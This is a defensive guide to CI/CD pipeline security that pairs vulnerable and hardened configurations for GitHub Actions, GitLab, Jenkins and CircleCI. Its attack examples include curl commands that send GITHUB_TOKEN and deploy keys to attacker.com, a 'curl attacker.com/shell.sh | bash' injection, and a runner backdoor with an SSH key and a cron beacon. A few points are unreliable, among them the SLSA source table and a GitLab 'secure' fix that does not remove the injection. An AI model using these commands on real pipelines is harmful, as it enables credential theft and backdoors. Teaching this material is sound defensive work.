# Build Pipeline Security

## The CI/CD Attack Surface

Continuous Integration and Continuous Deployment (CI/CD) pipelines have become prime targets for supply chain attacks. These systems hold the keys to production: deployment credentials, signing keys, environment variables, and the ability to modify what gets built and shipped. A single compromised pipeline can inject malicious code into every artifact it produces, potentially affecting thousands of downstream consumers.

The attack surface of modern CI/CD systems is vast and often poorly understood. GitHub Actions alone processes over 200 million workflow runs per month. GitLab CI/CD, Jenkins, and CircleCI collectively process billions of builds annually. Each build represents a potential entry point for an attacker.

---

## GitHub Actions Security

### Workflow Syntax and Attack Vectors

GitHub Actions workflows are defined in YAML files within the `.github/workflows/` directory of a repository. The declarative syntax belies significant security complexity:

```yaml
# .github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:  # ← This trigger is the primary entry point for PR-based attacks
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # VULNERABLE: Using untrusted input in a script
      - name: Build
        run: |
          echo "Building ${{ github.event.pull_request.title }}"
          ./build.sh "${{ github.event.pull_request.title }}"
      
      # VULNERABLE: Checkout of PR code with write access to main
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # PR code, not main
      
      # SAFE: Using checkout on main (merge commit)
      - uses: actions/checkout@v4  # Defaults to the merge commit
```

### Script Injection via Pull Request Payloads

The most prevalent GitHub Actions vulnerability is script injection through pull request payloads. When a workflow uses `github.event.pull_request.*` values in a `run:` block without proper sanitization, an attacker can craft a PR title, body, or branch name that injects shell commands:

```yaml
# VULNERABLE workflow
name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Test
        run: | 
          echo "PR from ${{ github.event.pull_request.head.repo.full_name }}"
          echo "PR title: ${{ github.event.pull_request.title }}"
          # An attacker sets the PR title to: test"; curl https://attacker.com/$GITHUB_TOKEN; echo "
          # Which becomes: echo "PR title: test"; curl https://attacker.com/$GITHUB_TOKEN; echo ""
```

**Remediation: Use environment variables instead of template expressions:**

```yaml
# SECURE workflow
name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Test
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_REPO: ${{ github.event.pull_request.head.repo.full_name }}
        run: |
          echo "PR from $PR_REPO"
          echo "PR title: $PR_TITLE"
          # Shell treats environment variables as data, not code
```

### Poisoned Pipeline Execution (PPE)

Poisoned Pipeline Execution (PPE) is a class of vulnerability where an attacker with write access to a repository fork (or any ability to submit a PR) can modify the CI/CD pipeline itself. There are two variants:

**Direct PPE (d-PPE):**

The attacker modifies the workflow file directly in their fork. When the PR triggers the CI pipeline, the modified workflow runs with the permissions of the target repository:

```yaml
# Attacker's fork: modify .github/workflows/ci.yml
name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate secrets
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: |
          curl -X POST https://attacker.com/collect \
            -H "Content-Type: application/json" \
            -d "{\"token\": \"$GITHUB_TOKEN\", \"key\": \"$DEPLOY_KEY\"}"
      
      - name: Legitimate build
        run: ./build.sh
```

**Indirect PPE (i-PPE):**

The attacker modifies a configuration file or script that the workflow executes, without modifying the workflow itself:

```yaml
# Workflow remains unchanged, but it sources a config file
name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: source build.env && make  # build.env is from the PR!
```

```bash
# Attacker's build.env in the PR fork
COMMAND_PREFIX="curl https://attacker.com/$GITHUB_TOKEN && "
# Or more subtly:
MAKEFLAGS="--eval='all:\n\tcurl https://attacker.com/collect'"
```

**GitHub's mitigation: `pull_request_target`**

```yaml
# Using pull_request_target to run the WORKFLOW from the BASE branch
# But still check out the PR code SAFELY
name: CI
on: pull_request_target  # Uses workflow from base branch
jobs:
  build:
    runs-on: ubuntu-latest
    # IMPORTANT: Restrict permissions
    permissions:
      contents: read  # Only read access to the repository
    steps:
      # SAFE: This checks out the workflow's commit (base branch)
      - uses: actions/checkout@v4
      
      # VULNERABLE: Checking out the PR code with elevated permissions
      # - uses: actions/checkout@v4
      #   with:
      #     ref: ${{ github.event.pull_request.head.sha }}
      # ^ This is dangerous with pull_request_target and write permissions!
```

### Self-Hosted Runner Abuse

GitHub Actions self-hosted runners present unique security challenges. Unlike GitHub-hosted runners, which are ephemeral fresh VMs for each job, self-hosted runners persist between jobs and can be compromised:

```yaml
# An attacker submits a PR that runs:
jobs:
  persist:
    runs-on: [self-hosted, linux]
    steps:
      - name: Persist backdoor
        run: |
          # Write SSH key to runner's authorized_keys
          mkdir -p ~/.ssh
          echo "ssh-rsa AAAA... attacker@malicious" >> ~/.ssh/authorized_keys
          
          # Modify runner's systemd service
          sudo sed -i 's/runsvc.sh/runsvc.sh \&/' /etc/systemd/system/actions.runner.service
          
          # Plant a cron job
          echo "* * * * * curl https://attacker.com/heartbeat?runner=$(hostname)" | crontab -
```

**Self-hosted runner security recommendations:**

1. **Use ephemeral runners**: Configure `ephemeral: true` so runners are destroyed after each job
2. **Use runner groups**: Restrict which repositories can use which runners
3. **Network isolation**: Self-hosted runners should not have access to sensitive networks
4. **Label-based access**: Use labels to restrict which jobs can run on which runners
5. **Never use self-hosted runners for public repositories**

---

## GitLab CI/CD Security

### Pipeline Configuration and Injection

GitLab CI/CD uses `.gitlab-ci.yml` for pipeline configuration. Similar injection risks exist:

```yaml
# VULNERABLE GitLab CI configuration
build:
  script:
    - echo "Building $CI_MERGE_REQUEST_TITLE"
    - ./build.sh "$CI_MERGE_REQUEST_TITLE"
    # An attacker can inject commands via the merge request title
```

**Secure configuration:**

```yaml
# SECURE GitLab CI configuration
variables:
  MR_TITLE: $CI_MERGE_REQUEST_TITLE

build:
  script:
    - echo "Building ${MR_TITLE}"
    - ./build.sh "${MR_TITLE}"
```

### Protected Branches and Environments

GitLab provides several defense mechanisms:

```yaml
# Use protected environments for deployment
deploy_production:
  stage: deploy
  environment:
    name: production
    # Only allow deployment from protected branches
  only:
    - main
  # Requires approval from designated users
  when: manual
```

**GitLab security features:**
- **Protected branches**: Restrict who can push and merge to critical branches
- **Protected environments**: Restrict deployment access to specific users/groups
- **Protected variables**: Only expose secrets to protected environments
- **Code Owners**: Enforce review requirements for specific files
- **Pipeline approval**: Require manual approval before sensitive pipeline steps

---

## Jenkins Security

### Script Pipeline Injection

Jenkins Pipelines (both declarative and scripted) are vulnerable to injection attacks, particularly when using shared libraries:

```groovy
// VULNERABLE: Jenkins shared library that processes untrusted input
@Library('my-lib') _

pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                // VULNERABLE: Using untrusted input in shell script
                sh "echo Building ${params.BRANCH_NAME}"
                // An attacker sets BRANCH_NAME to: main; curl attacker.com/shell.sh | bash;
            }
        }
    }
}
```

**Jenkins security hardening:**

```groovy
// SECURE: Jenkins pipeline with sandboxed groovy
pipeline {
    agent any
    options {
        // Restrict groovy sandbox permissions
        disableConcurrentBuilds()
        buildDiscarder(logRotator(numToKeepStr: '10'))
    }
    stages {
        stage('Build') {
            steps {
                // Use triple-single-quotes to prevent Groovy interpolation
                sh '''
                    echo "Building branch"
                    ./build.sh
                '''
            }
        }
    }
}
```

**Jenkins security best practices:**
- Enable script approval for shared libraries
- Use `credentials()` binding instead of environment variables for secrets
- Restrict agent connectivity with security groups
- Use the Jenkins matrix authorization strategy
- Enable CSRF protection (crumb issuer)
- Use the pipeline REST API plugin for better control over pipeline inputs
- Quarantine Jenkins agents after each build

---

## CircleCI Security

### Context and Secret Management

CircleCI uses "contexts" to manage secrets across pipelines:

```yaml
# .circleci/config.yml
version: 2.1
jobs:
  deploy:
    docker:
      - image: cimg/base:stable
    steps:
      - checkout
      # VULNERABLE: Checkout of PR code with production secrets
      - run:
          name: Deploy
          command: |
            echo $DEPLOY_KEY | base64 -d > /tmp/deploy_key
            ssh -i /tmp/deploy_key user@production 'deploy'
```

**CircleCI security features:**
- **Restricted contexts**: Limit which projects can access contexts
- **Self-hosted runners**: CircleCI runner provides isolated execution environments
- **OIDC tokens**: Use OpenID Connect for keyless authentication to cloud providers
- **Approval jobs**: Require manual approval before deployment steps

---

## Artifact Tampering

### Build Output Integrity

Artifact tampering occurs when an attacker modifies the output of a build process between the build and deployment stages. Without integrity guarantees, there is no way to verify that the artifact deployed to production matches the source code.

**Attack scenarios:**
1. An attacker with access to the artifact storage (S3 bucket, Artifactory) modifies the artifact
2. A compromised build server modifies the artifact during the build process
3. A man-in-the-middle intercepts the artifact during transfer
4. A malicious actor inside the organization modifies the artifact

**Defense: Content-addressable storage and signing**

```bash
# Generate SHA-256 hash of the artifact
sha256sum build/output.tar.gz > build/output.tar.gz.sha256

# Sign the hash with a private key
openssl dgst -sha256 -sign build-signing.key \
  -out build/output.tar.gz.sha256.sig \
  build/output.tar.gz

# Verify the artifact integrity
sha256sum -c build/output.tar.gz.sha256
openssl dgst -sha256 -verify build-signing.pub \
  -signature build/output.tar.gz.sha256.sig \
  build/output.tar.gz

# Store the signature in a transparency log
cosign sign --key build-signing.key \
  registry.example.com/my-app:v1.2.3
```

---

## Build Reproducibility

### The Reproducibility Problem

A build is reproducible if, given the same source code, build environment, and build inputs, the output is bit-for-bit identical. Most builds are not reproducible due to:

1. **Timestamps embedded in binaries**: Build timestamps, file modification times
2. **Non-deterministic ordering**: Hash table iteration, directory listing order
3. **Compiler non-determinism**: Different compiler versions produce different output
4. **Random values**: UUID generation, ASLR seed values embedded in binaries
5. **Locale-dependent behavior**: String sorting, number formatting

### Reproducible Build Implementation

```dockerfile
# Build with fixed timestamp and locale
FROM debian:bookworm-slim AS builder
ENV SOURCE_DATE_EPOCH=1700000000
ENV LC_ALL=C
ENV TZ=UTC

# Pin exact package versions
RUN apt-get update && apt-get install -y \
    gcc=12.2.0-14 \
    make=4.3-4.1 \
    && rm -rf /var/lib/apt/lists/*

# Build with reproducible settings
COPY src/ /app/src/
WORKDIR /app
RUN make CC=gcc LDFLAGS=-Wl,--build-id=sha1

# Verify reproducibility
RUN sha256sum /app/my-binary
```

**Debian Reproducible Builds:**

Debian has been a leader in reproducible builds since 2013. The project provides `diffoscope` for comparing build outputs and `reprotest` for testing reproducibility:

```bash
# Compare two build outputs
diffoscope build1/my-app.deb build2/my-app.deb

# Test build reproducibility
reprotest --source-dir ./src --build-command 'make'
```

### Hermetic Builds

A hermetic build is one that is completely isolated from the host system. All inputs (source, tools, dependencies) are explicitly specified, and no network access is allowed during the build:

**Bazel hermetic build rules:**

```python
# WORKSPACE
load("@bazel_tools//tools/build_defs/repo:http.bzl", "http_archive")

# All dependencies explicitly pinned with integrity hashes
http_archive(
    name = "openssl",
    urls = ["https://www.openssl.org/source/openssl-3.1.2.tar.gz"],
    sha256 = "a0cee2a8f8a4b9e7a92f82d6d7c0f4a7f8f4a7f8a4b9e7a92f82d6d7c0f4a7f8",
)

# Starlark rule enforcing hermetic builds
build_rule(
    name = "my_app",
    srcs = glob(["src/**/*.cc"]),
    deps = ["@openssl"],
    # No network access during build
    tags = ["no-network"],
)
```

**Nix hermetic builds:**

```nix
# flake.nix
{
  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixpkgs-23.11-darwin";
  };
  outputs = { self, nixpkgs }:
    let
      system = "x86_64-linux";
      pkgs = nixpkgs.legacyPackages.${system};
    in {
      packages.${system}.default = pkgs.stdenv.mkDerivation {
        name = "my-app";
        src = self;
        buildInputs = [ pkgs.openssl ];
        # Nix builds are hermetic by default: no network, fixed inputs, sandboxed
      };
    };
}
```

---

## GitHub's npm Provenance Signing

### Provenance Generation

GitHub and npm have implemented provenance signing for npm packages published from GitHub Actions. Provenance is a signed attestation that links a package to its source repository, commit, and build instructions:

```yaml
# .github/workflows/publish.yml
name: Publish npm package
on:
  release:
    types: [published]

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write    # Required for provenance signing
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          registry-url: 'https://registry.npmjs.org'
      
      - run: npm ci
      - run: npm run build
      
      # Publish with provenance
      - run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

The resulting provenance attestation is stored in npm's registry and can be verified:

```bash
# Verify npm provenance
npm audit signatures

# View provenance for a package
npm view express --json | jq '.provenance'
```

---

## SLSA Framework Integration

The Supply-chain Levels for Software Artifacts (SLSA) framework provides a comprehensive model for securing CI/CD pipelines. At its core, SLSA defines requirements for source, build, and provenance that, when met, provide increasing levels of confidence in the integrity of the supply chain:

### SLSA Source Requirements (Level 1-3)

| Level | Requirement | Description |
|-------|-------------|-------------|
| 1 | Version controlled | Every change is tracked in a version control system |
| 2 | Verified history | Two-person review required for changes to the source |
| 3 | Two-person review | Changes require approval from at least one trusted person |

### SLSA Build Requirements (Level 1-3)

| Level | Requirement | Description |
|-------|-------------|-------------|
| 1 | Provenance exists | Build process generates provenance metadata |
| 2 | Hosted build platform | Build runs on a hosted, multi-tenant platform |
| 3 | Non-falsifiable provenance | Provenance cannot be forged (signed with trusted key) |

### SLSA Provenance Format

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "subject": [
    {
      "name": "registry.npmjs.org/my-package/1.0.0",
      "digest": {
        "sha256": "abc123..."
      }
    }
  ],
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "predicate": {
    "builder": {
      "id": "https://github.com/actions/runner"
    },
    "buildType": "https://github.com/actions/workflow",
    "invocation": {
      "configSource": {
        "uri": "https://github.com/owner/repo/blob/main/.github/workflows/ci.yml",
        "digest": {
          "sha1": "abc123..."
        },
        "entryPoint": "build"
      },
      "parameters": {},
      "environment": {
        "github_actor": "maintainer",
        "github_run_id": "123456"
      }
    },
    "materials": [
      {
        "uri": "https://github.com/owner/repo",
        "digest": {
          "sha1": "def456..."
        }
      }
    ]
  }
}
```

---

## Secrets Management in CI/CD

### The Secrets Problem

CI/CD pipelines are集中 repositories of secrets—API keys, database credentials, signing keys, cloud credentials, and deployment tokens. A single pipeline may contain dozens of secrets, each of which is a potential attack vector if exposed:

**Common secret exposure vectors:**
- Secrets printed in build logs (accidental `echo` or `print` statements)
- Secrets stored in environment variables that are dumped on error
- Secrets in Docker layers (building images with `ARG` that contains secrets)
- Secrets in artifact metadata (secrets embedded in build output)
- Secrets in forked repositories (secrets accessible to PR authors)
- Secrets in self-hosted runners (persisted on disk between builds)

### GitHub Actions Secrets

```yaml
# SECURE: Using GitHub Actions secrets properly
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # SECURE: Use secrets through environment variables
      - name: Deploy to production
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
          API_TOKEN: ${{ secrets.API_TOKEN }}
        run: |
          # Use secrets through environment variables, never echo them
          ssh -i <(echo "$DEPLOY_KEY") user@production 'deploy'
        
      # VULNERABLE: Never use secrets in template expressions
      # - run: echo "Deploying with ${{ secrets.API_TOKEN }}"  # DO NOT DO THIS
      
      # VULNERABLE: Never pass secrets as command-line arguments
      # - run: deploy --token ${{ secrets.API_TOKEN }}  # DO NOT DO THIS
```

### OIDC-Based Authentication

OpenID Connect (OIDC) eliminates the need for long-lived secrets by using short-lived tokens:

```yaml
# OIDC authentication to AWS (no static credentials)
name: Deploy to AWS
on: push

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write  # Required for OIDC
      contents: read
    steps:
      - uses: actions/checkout@v4
      
      # Authenticate to AWS using OIDC (no access keys needed)
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeployRole
          aws-region: us-east-1
      
      - name: Deploy to EKS
        run: |
          kubectl apply -f k8s/deployment.yml
```

**AWS IAM Role Configuration for OIDC:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:myorg/my-repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

### Docker Layer Secrets

Docker builds often inadvertently include secrets in image layers. Use Docker BuildKit's secret mounting to prevent this:

```dockerfile
# VULNERABLE: Secret in Dockerfile (persists in layer history)
ARG DATABASE_URL=mysql://user:password@host/db
RUN migrate

# SECURE: Use BuildKit secret mounting
RUN --mount=type=secret,id=db_url \
    export DB_URL=$(cat /run/secrets/db_url) && \
    migrate

# SECURE: Use BuildKit SSH agent forwarding
RUN --mount=type=ssh \
    git clone git@github.com:myorg/my-repo.git
```

```bash
# Build with secret mounting
docker build --secret id=db_url,src=db_url.txt --ssh default . -t my-app

# Verify no secrets in image history
docker history my-app --no-trunc | grep -i password
```

---

## Artifact Security

### Container Image Signing and Verification

```bash
# Sign a container image with cosign
cosign sign --key cosign.key registry.example.com/my-app:v1.2.3

# Verify a container image signature
cosign verify --key cosign.pub registry.example.com/my-app:v1.2.3

# Sign with keyless (Sigstore) authentication
cosign sign registry.example.com/my-app:v1.2.3

# Verify keyless signature
cosign verify registry.example.com/my-app:v1.2.3 \
  --certificate-identity=my-ci@mycompany.iam.gserviceaccount.com \
  --certificate-oidc-issuer=https://accounts.google.com

# Copy signature to another registry
cosign copy registry.example.com/my-app:v1.2.3 registry.example.com/my-app:v1.2.3
```

### Kubernetes Admission Control for Image Verification

```yaml
# Kyverno policy: Require signed images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: validate-image-signatures
spec:
  validationFailureAction: Enforce
  background: false
  rules:
    - name: verify-cosign-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
      verifyImages:
        - imageReferences:
            - "registry.example.com/*"
          attestors:
            - entries:
                - keys:
                    publicKeys: |-
                      -----BEGIN PUBLIC KEY-----
                      MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
                      -----END PUBLIC KEY-----
```

---

## CI/CD Attack Reconstruction

### Attack Scenario: Compromising a Build Pipeline

To understand the full impact of a CI/CD compromise, consider a realistic attack scenario:

1. **Initial Access**: An attacker gains access to a developer's GitHub account through credential stuffing or phishing.

2. **Reconnaissance**: The attacker identifies a repository with CI/CD workflows that use `pull_request_target` with elevated permissions.

3. **Payload**: The attacker submits a pull request that modifies a dependency configuration file (e.g., `package.json`) to include a malicious dependency.

4. **Execution**: The CI/CD workflow runs on the PR, executing the malicious dependency's `postinstall` script.

5. **Exfiltration**: The postinstall script reads environment variables containing deployment credentials and exfiltrates them via DNS.

6. **Persistence**: The attacker uses the deployment credentials to push a backdoored build to production.

7. **Lateral Movement**: The attacker uses the backdoored build to access production infrastructure.

This scenario demonstrates why CI/CD pipeline security is not just a DevOps concern—it is a core security concern that requires the same rigor as production system security.

---

## CI/CD Security Hardening Checklist

| Control | Priority | Platform |
|---------|----------|----------|
| Set `permissions: contents: read` as default | Critical | GitHub Actions |
| Use `pull_request_target` carefully (never checkout PR code with write perms) | Critical | GitHub Actions |
| Use environment variables instead of template expressions in `run:` blocks | Critical | All |
| Never use self-hosted runners for public repos | Critical | GitHub Actions |
| Use ephemeral runners | High | All |
| Pin action versions to SHA (not tags) | Critical | GitHub Actions |
| Use OIDC for cloud authentication instead of static secrets | High | AWS, GCP, Azure |
| Enable branch protection and required reviews | Critical | All |
| Use signed commits and tags | High | All |
| Scan PRs for CI/CD changes | High | All |
| Implement SLSA Level 2+ provenance | Medium | All |
| Use hermetic/reproducible builds | Medium | All |
| Rotate secrets on each build | Medium | All |
| Use `GITHUB_TOKEN` with minimal permissions | Critical | GitHub Actions |
| Separate build and deployment pipelines | High | All |

---

## References

1. Google. "SLSA: Supply-chain Levels for Software Artifacts." https://slsa.dev/
2. GitHub. "Security hardening for GitHub Actions." https://docs.github.com/en/actions/security-guides
3. CISA. "Defending Against Software Supply Chain Attacks." 2021. https://www.cisa.gov/sbom
4. Boyens, J., et al. "Practices for Securing Critical Software Supply Chains." NIST SP 800-218. https://csrc.nist.gov/publications/detail/sp/800-218/final
5. Lublin, S. "Poisoned Pipeline Execution." Cider Security, 2022. https://www.cidersecurity.io/blog/research/poisoned-pipeline-execution-ppc/
6. Pfizer, S. "GitHub Actions Security Best Practices." GitHub Security Lab, 2023. https://securitylab.github.com/
7. SLSA Specification v1.0. "Threat Model." https://slsa.dev/spec/v1.0/threats
8. OpenSSF. "Scorecard: Automated Security Assessment." https://github.com/ossf/scorecard
9. NIST SP 800-218. "Secure Software Development Framework." https://csrc.nist.gov/publications/detail/sp/800-218/final
10. US Executive Order 14028. "Improving the Nation's Cybersecurity." May 2021. https://www.federalregister.gov/documents/2021/05/17/2021-10460/improving-the-nations-cybersecurity
11. Sigstore. "Fulcio: Certificate Authority." https://github.com/sigstore/fulcio
12. Sigstore. "Rekor: Transparency Log." https://github.com/sigstore/rekor
13. npm Documentation. "Provenance." https://docs.npmjs.com/generating-provenance-statements
14. CISA. "Securing the Software Supply Chain: Guide for Developers." https://www.cisa.gov/sbom